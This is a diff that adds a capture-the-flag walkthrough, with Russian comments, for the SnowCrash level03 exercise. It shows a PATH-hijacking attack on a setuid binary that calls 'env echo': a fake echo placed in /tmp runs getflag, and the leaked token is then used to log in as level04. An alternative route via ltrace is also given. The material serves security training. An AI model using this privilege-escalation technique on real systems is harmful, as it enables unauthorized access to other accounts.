@@ -1,0 +1,42 @@
+level03@SnowCrash:~$ ls
+level03
+
+*Предполагается, что этот исполняемый файл необходимо использовать.
+*Запускаем исполняемый файл. 
+level03@SnowCrash:~$ ./level03
+Exploit me
+
+level03@SnowCrash:~$ strings level03 | grep "Exploit me"
+/usr/bin/env echo Exploit me
+
+* не можем использовать команду getflag напрямую.
+* Мы попытаемся передать команду getflag команде echo.
+level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
+
+* меняем env так, чтобы программа искала нашу символическую ссылку.
+level03@SnowCrash:~$ PATH="/tmp/"
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+level03@SnowCrash:~$ su level04
+Command 'su' is available in '/bin/su'
+The command could not be located because '/bin' is not included in the PATH environment variable.
+su: command not found
+level03@SnowCrash:~$ PATH="/bin/"
+level03@SnowCrash:~$ su level04
+Password: /qi0maab88jeaj46qoumi7maus/
+level04@SnowCrash:~$
+
+-----
+//alternative solution:
+ltrace ./level03
+system("/usr/bin/env echo Exploit me"Exploit me
+level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ PATH="/tmp/"
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+PATH="/bin/"
+su level04
+-------
